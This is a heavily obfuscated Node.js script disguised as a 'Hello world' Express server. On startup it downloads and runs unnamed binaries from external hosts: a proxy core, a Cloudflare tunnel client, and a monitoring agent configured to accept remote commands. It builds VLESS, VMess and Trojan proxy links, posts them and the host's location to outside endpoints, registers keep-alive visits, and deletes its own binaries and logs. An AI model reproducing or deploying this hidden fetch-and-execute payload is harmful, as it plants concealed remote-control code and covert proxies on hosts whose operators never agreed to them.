const _0x306a95=_0x3bdd;(function(_0x560858,_0x3bf0af){const _0x1610ea=_0x3bdd,_0x1ed9dc=_0x560858();while(!![]){try{const _0x26485b=parseInt(_0x1610ea(0x1af))/0x1+-parseInt(_0x1610ea(0x16a))/0x2*(-parseInt(_0x1610ea(0x190))/0x3)+-parseInt(_0x1610ea(0xfd))/0x4*(-parseInt(_0x1610ea(0xf8))/0x5)+-parseInt(_0x1610ea(0x110))/0x6*(-parseInt(_0x1610ea(0x16c))/0x7)+parseInt(_0x1610ea(0x198))/0x8*(-parseInt(_0x1610ea(0x186))/0x9)+-parseInt(_0x1610ea(0x181))/0xa+-parseInt(_0x1610ea(0x1a8))/0xb;if(_0x26485b===_0x3bf0af)break;else _0x1ed9dc['push'](_0x1ed9dc['shift']());}catch(_0x106208){_0x1ed9dc['push'](_0x1ed9dc['shift']());}}}(_0x4ae7,0x71444));function _0x4ae7(){const _0x2165f8=['/dev/null','get','quic','message','\x0a\x0avmess://','existsSync','nohup\x20','boot.log','statSync','util','arm','sub','/vless-argo','https+local://8.8.8.8/dns-query','Skipping\x20adding\x20automatic\x20access\x20task','org','2087','App\x20is\x20running','taskkill\x20/f\x20/im\x20','cdns.doon.eu.org','stream','child_process','createWriteStream','status','chmod','env','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','ArgoDomain:','stringify','\x20>/dev/null\x202>&1','Hello\x20world!','exec','\x20already\x20exists','xtls-rprx-vision','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','has','random','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','win32','none','\x0a\x20\x20credentials-file:\x20','UPLOAD_URL','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','443','/api/add-nodes','\x20>/dev/null\x202>&1\x20&','262OvKKJO','PROJECT_URL','6167GsjQFX','TunnelSecret','Unknown','/vmess-argo','&fp=firefox&type=ws&host=','freedom','FILE_PATH','/api/delete-nodes','send','\x20-p\x20','application/json','readFileSync','?security=tls&sni=','close','UUID','fileName','amd','tls','8443','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','config.yaml','3027490GstPLN','&path=%2Fvless-argo%3Fed%3D2560#','path','then','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','9BQwKNY','Empowerment\x20failed\x20for\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','\x0a\x20\x20\x20\x20','https://arm64.ssss.nyc.mn/web','PORT','error','NEZHA_SERVER','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','test','20793gkdhCv','\x20-c\x20\x22','Download\x20','tunnel.yml','/trojan-argo','list.txt','/sub.txt\x20saved\x20successfully','fileUrl','3230096kevGyO','del\x20/f\x20/q\x20','\x20failed:\x20','http','./tmp','https://ipapi.co/json/','http://ip-api.com/json/','php\x20running\x20error:\x20','basename','forEach','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','mkdirSync','Nodes\x20uploaded\x20successfully','\x20>\x20nul\x202>&1','https://arm64.ssss.nyc.mn/v1','text/plain;\x20charset=utf-8','9632326qBrvFq','ARGO_DOMAIN','Error\x20executing\x20command:\x20','filter','base64','vless','match','417147AQPtvT','127.0.0.1','map','floor','catch','https://amd64.ssss.nyc.mn/agent','ARGO_PORT','\x20is\x20created','SERVER_PORT','from','\x20-c\x20','post','log','pipe','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','config.json','npm\x20running\x20error:\x20','5mrXWqS','success','pkill\x20-f\x20\x22[','/vmess-argo?ed=2560','\x20successfully','2436488ySoDGa','\x20-s\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','toString','data','Error\x20in\x20startserver:','ARGO_DOMAIN:','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','NEZHA_KEY','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','rm\x20-rf\x20','Unhandled\x20error\x20in\x20startserver:','charAt','block','listen','2083','\x0a\x20\x20tunnel:\x20','false','\x22\x20>\x20/dev/null\x202>&1','762DYAaue','9afd1229-b893-40c1-84dd-51e7ce204913','countryCode','split','clear','tcp','country_code','ARGO_AUTH','Error\x20reading\x20boot.log:','https://arm64.ssss.nyc.mn/bot','tunnel.json','unlinkSync','push','substring','utf-8','axios','web\x20running\x20error:\x20','NAME','response','Error\x20downloading\x20files:','true','firefox','automatic\x20access\x20task\x20added\x20successfully','trojan','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','platform','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','all','https://amd64.ssss.nyc.mn/v1','Empowerment\x20success\x20for\x20','https://amd64.ssss.nyc.mn/web','\x0aclient_secret:\x20','includes','2096','join','AUTO_ACCESS','\x0avless://','writeFileSync','\x20is\x20running','length','/tunnel.yml\x20run','unshift','express','?encryption=none&security=tls&sni='];_0x4ae7=function(){return _0x2165f8;};return _0x4ae7();}const express=require(_0x306a95(0x13a)),app=express(),axios=require(_0x306a95(0x11f)),os=require('os'),fs=require('fs'),path=require(_0x306a95(0x183)),{promisify}=require(_0x306a95(0x145)),exec=promisify(require(_0x306a95(0x151))[_0x306a95(0x15b)]),{execSync}=require(_0x306a95(0x151)),UPLOAD_URL=process[_0x306a95(0x155)][_0x306a95(0x165)]||'',PROJECT_URL=process['env'][_0x306a95(0x16b)]||'',AUTO_ACCESS=process[_0x306a95(0x155)][_0x306a95(0x133)]||![],FILE_PATH=process[_0x306a95(0x155)][_0x306a95(0x172)]||_0x306a95(0x19c),SUB_PATH=process['env']['SUB_PATH']||_0x306a95(0x147),PORT=process['env'][_0x306a95(0x1b7)]||process[_0x306a95(0x155)][_0x306a95(0x18b)]||0xbb8,UUID=process['env'][_0x306a95(0x17a)]||_0x306a95(0x111),NEZHA_SERVER=process['env'][_0x306a95(0x18d)]||'',NEZHA_PORT=process[_0x306a95(0x155)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x306a95(0x155)][_0x306a95(0x105)]||'',ARGO_DOMAIN=process['env'][_0x306a95(0x1a9)]||'',ARGO_AUTH=process['env'][_0x306a95(0x117)]||'',ARGO_PORT=process[_0x306a95(0x155)][_0x306a95(0x1b5)]||0x1f41,CFIP=process[_0x306a95(0x155)]['CFIP']||_0x306a95(0x14f),CFPORT=process['env']['CFPORT']||0x1bb,NAME=process[_0x306a95(0x155)][_0x306a95(0x121)]||'';function _0x3bdd(_0x4e1787,_0x324160){_0x4e1787=_0x4e1787-0xf1;const _0x4ae727=_0x4ae7();let _0x3bdd17=_0x4ae727[_0x4e1787];return _0x3bdd17;}!fs[_0x306a95(0x141)](FILE_PATH)?(fs[_0x306a95(0x1a3)](FILE_PATH),console['log'](FILE_PATH+_0x306a95(0x1b6))):console['log'](FILE_PATH+_0x306a95(0x15c));function generateRandomName(){const _0xa30be6=_0x306a95,_0x58ac3e='abcdefghijklmnopqrstuvwxyz';let _0x4129e5='';for(let _0x197aaa=0x0;_0x197aaa<0x6;_0x197aaa++){_0x4129e5+=_0x58ac3e[_0xa30be6(0x109)](Math[_0xa30be6(0x1b2)](Math[_0xa30be6(0x160)]()*_0x58ac3e[_0xa30be6(0x137)]));}return _0x4129e5;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x306a95(0x132)](FILE_PATH,npmName),phpPath=path[_0x306a95(0x132)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x306a95(0x132)](FILE_PATH,botName),subPath=path[_0x306a95(0x132)](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,_0x306a95(0x195)),bootLogPath=path[_0x306a95(0x132)](FILE_PATH,_0x306a95(0x143)),configPath=path[_0x306a95(0x132)](FILE_PATH,'config.json');function deleteNodes(){const _0x110d94=_0x306a95;try{if(!UPLOAD_URL)return;if(!fs[_0x110d94(0x141)](subPath))return;let _0x24d21d;try{_0x24d21d=fs[_0x110d94(0x177)](subPath,'utf-8');}catch{return null;}const _0x4bba3a=Buffer[_0x110d94(0x1b8)](_0x24d21d,_0x110d94(0x1ac))[_0x110d94(0x100)](_0x110d94(0x11e)),_0x174bab=_0x4bba3a[_0x110d94(0x113)]('\x0a')[_0x110d94(0x1ab)](_0x3b2211=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x110d94(0x18f)](_0x3b2211));if(_0x174bab['length']===0x0)return;return axios[_0x110d94(0xf2)](UPLOAD_URL+_0x110d94(0x173),JSON[_0x110d94(0x158)]({'nodes':_0x174bab}),{'headers':{'Content-Type':'application/json'}})['catch'](_0x305864=>{return null;}),null;}catch(_0xa939a3){return null;}}function cleanupOldFiles(){const _0x1d56ed=_0x306a95;try{const _0x14389d=fs['readdirSync'](FILE_PATH);_0x14389d[_0x1d56ed(0x1a1)](_0x4781a9=>{const _0x2804b7=_0x1d56ed,_0x4b8644=path[_0x2804b7(0x132)](FILE_PATH,_0x4781a9);try{const _0x536cd5=fs[_0x2804b7(0x144)](_0x4b8644);_0x536cd5['isFile']()&&fs[_0x2804b7(0x11b)](_0x4b8644);}catch(_0xcf57){}});}catch(_0x383b16){}}app[_0x306a95(0x13d)]('/',function(_0x2be99a,_0x489902){const _0x489b08=_0x306a95;_0x489902[_0x489b08(0x174)](_0x489b08(0x15a));});async function generateConfig(){const _0x3766c0=_0x306a95,_0x37241b={'log':{'access':_0x3766c0(0x13c),'error':_0x3766c0(0x13c),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x3766c0(0x1ad),'settings':{'clients':[{'id':UUID,'flow':_0x3766c0(0x15d)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x3766c0(0x148),'dest':0xbba},{'path':_0x3766c0(0x16f),'dest':0xbbb},{'path':_0x3766c0(0x194),'dest':0xbbc}]},'streamSettings':{'network':_0x3766c0(0x115)}},{'port':0xbb9,'listen':_0x3766c0(0x1b0),'protocol':_0x3766c0(0x1ad),'settings':{'clients':[{'id':UUID}],'decryption':_0x3766c0(0x163)},'streamSettings':{'network':'tcp','security':_0x3766c0(0x163)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x3766c0(0x1ad),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x3766c0(0x163)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-argo'}},'sniffing':{'disabled':!![],'destOverride':[_0x3766c0(0x19b),'tls',_0x3766c0(0x13e)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x3766c0(0x1b0),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x3766c0(0x16f)}},'sniffing':{'disabled':!![],'destOverride':[_0x3766c0(0x19b),_0x3766c0(0x17d),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x3766c0(0x127),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x3766c0(0x163),'wsSettings':{'path':_0x3766c0(0x194)}},'sniffing':{'disabled':!![],'destOverride':['http',_0x3766c0(0x17d),_0x3766c0(0x13e)],'metadataOnly':![]}}],'dns':{'servers':[_0x3766c0(0x149)]},'outbounds':[{'protocol':_0x3766c0(0x171),'tag':'direct'},{'protocol':'blackhole','tag':_0x3766c0(0x10a)}]};fs['writeFileSync'](path[_0x3766c0(0x132)](FILE_PATH,_0x3766c0(0xf6)),JSON[_0x3766c0(0x158)](_0x37241b,null,0x2));}function getSystemArchitecture(){const _0x1aec29=_0x306a95,_0xeeea2f=os['arch']();return _0xeeea2f===_0x1aec29(0x146)||_0xeeea2f==='arm64'||_0xeeea2f==='aarch64'?_0x1aec29(0x146):_0x1aec29(0x17c);}function downloadFile(_0x547a2b,_0x1b5f38,_0x3552ed){const _0x47b916=_0x306a95,_0x5bf9fa=_0x547a2b;!fs[_0x47b916(0x141)](FILE_PATH)&&fs[_0x47b916(0x1a3)](FILE_PATH,{'recursive':!![]});const _0x1dec87=fs[_0x47b916(0x152)](_0x5bf9fa);axios({'method':_0x47b916(0x13d),'url':_0x1b5f38,'responseType':_0x47b916(0x150)})[_0x47b916(0x184)](_0x5388b0=>{const _0xd97401=_0x47b916;_0x5388b0[_0xd97401(0x101)][_0xd97401(0xf4)](_0x1dec87),_0x1dec87['on']('finish',()=>{const _0x5bc7c2=_0xd97401;_0x1dec87[_0x5bc7c2(0x179)](),console[_0x5bc7c2(0xf3)](_0x5bc7c2(0x192)+path[_0x5bc7c2(0x1a0)](_0x5bf9fa)+_0x5bc7c2(0xfc)),_0x3552ed(null,_0x5bf9fa);}),_0x1dec87['on']('error',_0xd804ac=>{const _0x45dd77=_0xd97401;fs['unlink'](_0x5bf9fa,()=>{});const _0x5cd54a=_0x45dd77(0x192)+path['basename'](_0x5bf9fa)+_0x45dd77(0x19a)+_0xd804ac[_0x45dd77(0x13f)];console[_0x45dd77(0x18c)](_0x5cd54a),_0x3552ed(_0x5cd54a);});})[_0x47b916(0x1b3)](_0x2759a5=>{const _0x42326b=_0x47b916,_0x2d2d7a=_0x42326b(0x192)+path['basename'](_0x5bf9fa)+_0x42326b(0x19a)+_0x2759a5[_0x42326b(0x13f)];console[_0x42326b(0x18c)](_0x2d2d7a),_0x3552ed(_0x2d2d7a);});}async function downloadFilesAndRun(){const _0x52a94c=_0x306a95,_0x135d14=getSystemArchitecture(),_0x5cef2a=getFilesForArchitecture(_0x135d14);if(_0x5cef2a[_0x52a94c(0x137)]===0x0){console[_0x52a94c(0xf3)](_0x52a94c(0x128));return;}const _0x5d741b=_0x5cef2a[_0x52a94c(0x1b1)](_0x582be1=>{return new Promise((_0x33401c,_0x20f159)=>{const _0x2fd8ec=_0x3bdd;downloadFile(_0x582be1[_0x2fd8ec(0x17b)],_0x582be1[_0x2fd8ec(0x197)],(_0x472b0e,_0x4b7800)=>{_0x472b0e?_0x20f159(_0x472b0e):_0x33401c(_0x4b7800);});});});try{await Promise[_0x52a94c(0x12b)](_0x5d741b);}catch(_0x346789){console[_0x52a94c(0x18c)](_0x52a94c(0x123),_0x346789);return;}function _0x5b838d(_0x1ff915){const _0x235c75=_0x52a94c,_0x259dfc=0x1fd;_0x1ff915[_0x235c75(0x1a1)](_0x2bdb66=>{const _0x1a3b05=_0x235c75;fs['existsSync'](_0x2bdb66)&&fs[_0x1a3b05(0x154)](_0x2bdb66,_0x259dfc,_0x327eb9=>{const _0x26994b=_0x1a3b05;_0x327eb9?console['error'](_0x26994b(0x187)+_0x2bdb66+':\x20'+_0x327eb9):console[_0x26994b(0xf3)](_0x26994b(0x12d)+_0x2bdb66+':\x20'+_0x259dfc[_0x26994b(0x100)](0x8));});});}const _0x5b13fe=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x5b838d(_0x5b13fe);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x297ece=NEZHA_SERVER[_0x52a94c(0x130)](':')?NEZHA_SERVER[_0x52a94c(0x113)](':')['pop']():'',_0x338c0d=new Set([_0x52a94c(0x167),_0x52a94c(0x17e),'2096',_0x52a94c(0x14c),_0x52a94c(0x10c),'2053']),_0x30e247=_0x338c0d[_0x52a94c(0x15f)](_0x297ece)?_0x52a94c(0x124):_0x52a94c(0x10e),_0x2bfe8c=_0x52a94c(0x12f)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x30e247+_0x52a94c(0x166)+UUID;fs['writeFileSync'](path[_0x52a94c(0x132)](FILE_PATH,_0x52a94c(0x180)),_0x2bfe8c);const _0x318f60=_0x52a94c(0x142)+phpPath+_0x52a94c(0x191)+FILE_PATH+_0x52a94c(0x185);try{await exec(_0x318f60),console[_0x52a94c(0xf3)](phpName+_0x52a94c(0x136)),await new Promise(_0x223e6c=>setTimeout(_0x223e6c,0x3e8));}catch(_0x32fafe){console[_0x52a94c(0x18c)](_0x52a94c(0x19f)+_0x32fafe);}}else{let _0x2a818c='';const _0x21bb76=[_0x52a94c(0x167),'8443',_0x52a94c(0x131),_0x52a94c(0x14c),_0x52a94c(0x10c),'2053'];_0x21bb76['includes'](NEZHA_PORT)&&(_0x2a818c='--tls');const _0x1a5ef1=_0x52a94c(0x142)+npmPath+_0x52a94c(0xfe)+NEZHA_SERVER+':'+NEZHA_PORT+_0x52a94c(0x175)+NEZHA_KEY+'\x20'+_0x2a818c+_0x52a94c(0xff);try{await exec(_0x1a5ef1),console[_0x52a94c(0xf3)](npmName+_0x52a94c(0x136)),await new Promise(_0x5dd105=>setTimeout(_0x5dd105,0x3e8));}catch(_0x51463d){console[_0x52a94c(0x18c)](_0x52a94c(0xf7)+_0x51463d);}}}else console['log'](_0x52a94c(0x188));const _0x54b2fc=_0x52a94c(0x142)+webPath+_0x52a94c(0xf1)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x54b2fc),console[_0x52a94c(0xf3)](webName+_0x52a94c(0x136)),await new Promise(_0x336ef7=>setTimeout(_0x336ef7,0x3e8));}catch(_0x15ad60){console[_0x52a94c(0x18c)](_0x52a94c(0x120)+_0x15ad60);}if(fs[_0x52a94c(0x141)](botPath)){let _0x243855;if(ARGO_AUTH[_0x52a94c(0x1ae)](/^[A-Z0-9a-z=]{120,250}$/))_0x243855=_0x52a94c(0x15e)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x243855=_0x52a94c(0x17f)+FILE_PATH+_0x52a94c(0x138):_0x243855=_0x52a94c(0x156)+FILE_PATH+_0x52a94c(0x161)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x243855+_0x52a94c(0x169)),console['log'](botName+_0x52a94c(0x136)),await new Promise(_0x27fda0=>setTimeout(_0x27fda0,0x7d0));}catch(_0x2ea6f6){console[_0x52a94c(0x18c)](_0x52a94c(0x1aa)+_0x2ea6f6);}}await new Promise(_0x45208c=>setTimeout(_0x45208c,0x1388));}function getFilesForArchitecture(_0x2a7893){const _0x468584=_0x306a95;let _0x3a8d42;_0x2a7893==='arm'?_0x3a8d42=[{'fileName':webPath,'fileUrl':_0x468584(0x18a)},{'fileName':botPath,'fileUrl':_0x468584(0x119)}]:_0x3a8d42=[{'fileName':webPath,'fileUrl':_0x468584(0x12e)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x32a8ce=_0x2a7893===_0x468584(0x146)?'https://arm64.ssss.nyc.mn/agent':_0x468584(0x1b4);_0x3a8d42[_0x468584(0x139)]({'fileName':npmPath,'fileUrl':_0x32a8ce});}else{const _0x33c01d=_0x2a7893===_0x468584(0x146)?_0x468584(0x1a6):_0x468584(0x12c);_0x3a8d42[_0x468584(0x139)]({'fileName':phpPath,'fileUrl':_0x33c01d});}}return _0x3a8d42;}function argoType(){const _0x2ca4ce=_0x306a95;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x2ca4ce(0xf3)](_0x2ca4ce(0x106));return;}if(ARGO_AUTH[_0x2ca4ce(0x130)](_0x2ca4ce(0x16d))){fs[_0x2ca4ce(0x135)](path[_0x2ca4ce(0x132)](FILE_PATH,_0x2ca4ce(0x11a)),ARGO_AUTH);const _0x1088fd=_0x2ca4ce(0x10d)+ARGO_AUTH[_0x2ca4ce(0x113)]('\x22')[0xb]+_0x2ca4ce(0x164)+path[_0x2ca4ce(0x132)](FILE_PATH,_0x2ca4ce(0x11a))+_0x2ca4ce(0x104)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x2ca4ce(0x12a);fs[_0x2ca4ce(0x135)](path[_0x2ca4ce(0x132)](FILE_PATH,_0x2ca4ce(0x193)),_0x1088fd);}else console['log'](_0x2ca4ce(0x1a2));}async function extractDomains(){const _0x546ec1=_0x306a95;let _0xf862e1;if(ARGO_AUTH&&ARGO_DOMAIN)_0xf862e1=ARGO_DOMAIN,console[_0x546ec1(0xf3)](_0x546ec1(0x103),_0xf862e1),await _0x48ddad(_0xf862e1);else try{const _0x41c343=fs[_0x546ec1(0x177)](path[_0x546ec1(0x132)](FILE_PATH,_0x546ec1(0x143)),_0x546ec1(0x11e)),_0x3c558f=_0x41c343['split']('\x0a'),_0x275168=[];_0x3c558f['forEach'](_0x567875=>{const _0x220f78=_0x546ec1,_0x33ebf6=_0x567875[_0x220f78(0x1ae)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x33ebf6){const _0xa24a9b=_0x33ebf6[0x1];_0x275168[_0x220f78(0x11c)](_0xa24a9b);}});if(_0x275168[_0x546ec1(0x137)]>0x0)_0xf862e1=_0x275168[0x0],console[_0x546ec1(0xf3)](_0x546ec1(0x157),_0xf862e1),await _0x48ddad(_0xf862e1);else{console[_0x546ec1(0xf3)](_0x546ec1(0x18e)),fs[_0x546ec1(0x11b)](path['join'](FILE_PATH,_0x546ec1(0x143)));async function _0x3e0229(){const _0x34170d=_0x546ec1;try{process[_0x34170d(0x129)]===_0x34170d(0x162)?await exec(_0x34170d(0x14e)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x34170d(0xfa)+botName[_0x34170d(0x109)](0x0)+']'+botName[_0x34170d(0x11d)](0x1)+_0x34170d(0x10f));}catch(_0x2a9882){}}_0x3e0229(),await new Promise(_0x3cfc1e=>setTimeout(_0x3cfc1e,0xbb8));const _0x176ed5='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x546ec1(0x161)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x176ed5+_0x546ec1(0x169)),console[_0x546ec1(0xf3)](botName+'\x20is\x20running'),await new Promise(_0x413a05=>setTimeout(_0x413a05,0xbb8)),await extractDomains();}catch(_0x5867a3){console['error'](_0x546ec1(0x1aa)+_0x5867a3);}}}catch(_0x1da081){console['error'](_0x546ec1(0x118),_0x1da081);}async function _0xecc34f(){const _0xb635f3=_0x546ec1;try{const _0x3cdaf7=await axios[_0xb635f3(0x13d)](_0xb635f3(0x19d),{'timeout':0xbb8});if(_0x3cdaf7[_0xb635f3(0x101)]&&_0x3cdaf7[_0xb635f3(0x101)]['country_code']&&_0x3cdaf7[_0xb635f3(0x101)][_0xb635f3(0x14b)])return _0x3cdaf7[_0xb635f3(0x101)][_0xb635f3(0x116)]+'_'+_0x3cdaf7[_0xb635f3(0x101)][_0xb635f3(0x14b)];}catch(_0x4801dc){try{const _0x207ac8=await axios[_0xb635f3(0x13d)](_0xb635f3(0x19e),{'timeout':0xbb8});if(_0x207ac8['data']&&_0x207ac8['data'][_0xb635f3(0x153)]===_0xb635f3(0xf9)&&_0x207ac8[_0xb635f3(0x101)][_0xb635f3(0x112)]&&_0x207ac8[_0xb635f3(0x101)][_0xb635f3(0x14b)])return _0x207ac8['data'][_0xb635f3(0x112)]+'_'+_0x207ac8[_0xb635f3(0x101)][_0xb635f3(0x14b)];}catch(_0x5e9c4c){}}return _0xb635f3(0x16e);}async function _0x48ddad(_0x14561f){const _0x41d06b=await _0xecc34f(),_0x1dda68=NAME?NAME+'-'+_0x41d06b:_0x41d06b;return new Promise(_0x18eb1c=>{setTimeout(()=>{const _0x56d023=_0x3bdd,_0x59d8ac={'v':'2','ps':''+_0x1dda68,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x56d023(0x163),'net':'ws','type':_0x56d023(0x163),'host':_0x14561f,'path':_0x56d023(0xfb),'tls':_0x56d023(0x17d),'sni':_0x14561f,'alpn':'','fp':_0x56d023(0x125)},_0x50cd54=_0x56d023(0x134)+UUID+'@'+CFIP+':'+CFPORT+_0x56d023(0x13b)+_0x14561f+'&fp=firefox&type=ws&host='+_0x14561f+_0x56d023(0x182)+_0x1dda68+_0x56d023(0x140)+Buffer['from'](JSON[_0x56d023(0x158)](_0x59d8ac))['toString']('base64')+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x56d023(0x178)+_0x14561f+_0x56d023(0x170)+_0x14561f+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x1dda68+_0x56d023(0x189);console[_0x56d023(0xf3)](Buffer[_0x56d023(0x1b8)](_0x50cd54)['toString']('base64')),fs[_0x56d023(0x135)](subPath,Buffer[_0x56d023(0x1b8)](_0x50cd54)[_0x56d023(0x100)](_0x56d023(0x1ac))),console[_0x56d023(0xf3)](FILE_PATH+_0x56d023(0x196)),uploadNodes(),app[_0x56d023(0x13d)]('/'+SUB_PATH,(_0x48b991,_0x2ba63a)=>{const _0x4ea67e=_0x56d023,_0x14ebd4=Buffer[_0x4ea67e(0x1b8)](_0x50cd54)[_0x4ea67e(0x100)](_0x4ea67e(0x1ac));_0x2ba63a['set']('Content-Type',_0x4ea67e(0x1a7)),_0x2ba63a[_0x4ea67e(0x174)](_0x14ebd4);}),_0x18eb1c(_0x50cd54);},0x7d0);});}}async function uploadNodes(){const _0x19a6bd=_0x306a95;if(UPLOAD_URL&&PROJECT_URL){const _0x59ea61=PROJECT_URL+'/'+SUB_PATH,_0x4c345e={'subscription':[_0x59ea61]};try{const _0x414721=await axios['post'](UPLOAD_URL+'/api/add-subscriptions',_0x4c345e,{'headers':{'Content-Type':_0x19a6bd(0x176)}});return _0x414721&&_0x414721['status']===0xc8?(console['log']('Subscription\x20uploaded\x20successfully'),_0x414721):null;}catch(_0x2e703c){if(_0x2e703c[_0x19a6bd(0x122)]){if(_0x2e703c[_0x19a6bd(0x122)][_0x19a6bd(0x153)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x19a6bd(0x141)](listPath))return;const _0x53206a=fs[_0x19a6bd(0x177)](listPath,_0x19a6bd(0x11e)),_0x298dd4=_0x53206a[_0x19a6bd(0x113)]('\x0a')[_0x19a6bd(0x1ab)](_0x5545b0=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x19a6bd(0x18f)](_0x5545b0));if(_0x298dd4[_0x19a6bd(0x137)]===0x0)return;const _0xca486c=JSON[_0x19a6bd(0x158)]({'nodes':_0x298dd4});try{const _0x1130e1=await axios[_0x19a6bd(0xf2)](UPLOAD_URL+_0x19a6bd(0x168),_0xca486c,{'headers':{'Content-Type':_0x19a6bd(0x176)}});return _0x1130e1&&_0x1130e1[_0x19a6bd(0x153)]===0xc8?(console['log'](_0x19a6bd(0x1a4)),_0x1130e1):null;}catch(_0x5a4333){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x38331e=_0x3bdd,_0x16e7ae=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x16e7ae[_0x38331e(0x11c)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x16e7ae['push'](phpPath);process['platform']===_0x38331e(0x162)?exec(_0x38331e(0x199)+_0x16e7ae[_0x38331e(0x132)]('\x20')+_0x38331e(0x1a5),_0x11634b=>{const _0x528dfd=_0x38331e;console[_0x528dfd(0x114)](),console[_0x528dfd(0xf3)](_0x528dfd(0x14d)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x38331e(0x107)+_0x16e7ae[_0x38331e(0x132)]('\x20')+_0x38331e(0x159),_0x1ac466=>{const _0x317749=_0x38331e;console[_0x317749(0x114)](),console[_0x317749(0xf3)](_0x317749(0x14d)),console[_0x317749(0xf3)](_0x317749(0xf5));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x305ed5=_0x306a95;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x305ed5(0xf3)](_0x305ed5(0x14a));return;}try{const _0x54a1d9=await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x305ed5(0xf3)](_0x305ed5(0x126)),_0x54a1d9;}catch(_0x24378d){return console[_0x305ed5(0x18c)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x24378d[_0x305ed5(0x13f)]),null;}}async function startserver(){const _0x4a103b=_0x306a95;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3265a2){console[_0x4a103b(0x18c)](_0x4a103b(0x102),_0x3265a2);}}startserver()[_0x306a95(0x1b3)](_0x2409bd=>{const _0x483ac7=_0x306a95;console[_0x483ac7(0x18c)](_0x483ac7(0x108),_0x2409bd);}),app[_0x306a95(0x10b)](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));